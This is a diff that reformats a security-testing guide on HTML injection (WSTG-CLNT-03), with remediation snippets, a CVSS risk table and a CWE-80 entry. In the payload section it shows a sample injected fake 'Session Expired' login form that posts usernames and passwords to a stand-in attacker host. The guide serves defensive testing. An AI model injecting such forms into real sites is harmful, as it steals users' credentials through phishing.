@@ -1,9 +1,11 @@
 # WSTG-CLNT-03: Testing for HTML Injection
 
 ## Test ID
+
 WSTG-CLNT-03
 
 ## Test Name
+
 Testing for HTML Injection
 
 ## High-Level Description
@@ -53,10 +55,10 @@ done
 ```html
 <!-- Test injecting a fake login form -->
 <form action="https://attacker.com/steal" method="POST">
-    <h2>Session Expired - Please Re-login</h2>
-    <input name="username" placeholder="Username">
-    <input name="password" type="password" placeholder="Password">
-    <button type="submit">Login</button>
+  <h2>Session Expired - Please Re-login</h2>
+  <input name="username" placeholder="Username" />
+  <input name="password" type="password" placeholder="Password" />
+  <button type="submit">Login</button>
 </form>
 ```
 
@@ -120,7 +122,7 @@ safe_output = html.escape(user_input)
 
 ```javascript
 // JavaScript - use textContent instead of innerHTML
-element.textContent = userInput;  // Safe
+element.textContent = userInput // Safe
 // NOT: element.innerHTML = userInput;  // Unsafe
 ```
 
@@ -128,17 +130,17 @@ element.textContent = userInput;  // Safe
 
 ## Risk Assessment
 
-| Finding | CVSS | Severity |
-|---------|------|----------|
-| HTML injection (phishing) | 4.3 | Medium |
-| HTML injection (defacement) | 3.5 | Low |
+| Finding                     | CVSS | Severity |
+| --------------------------- | ---- | -------- |
+| HTML injection (phishing)   | 4.3  | Medium   |
+| HTML injection (defacement) | 3.5  | Low      |
 
 ---
 
 ## CWE Categories
 
-| CWE ID | Title |
-|--------|-------|
+| CWE ID     | Title                                               |
+| ---------- | --------------------------------------------------- |
 | **CWE-80** | Improper Neutralization of Script-Related HTML Tags |
 
 ---
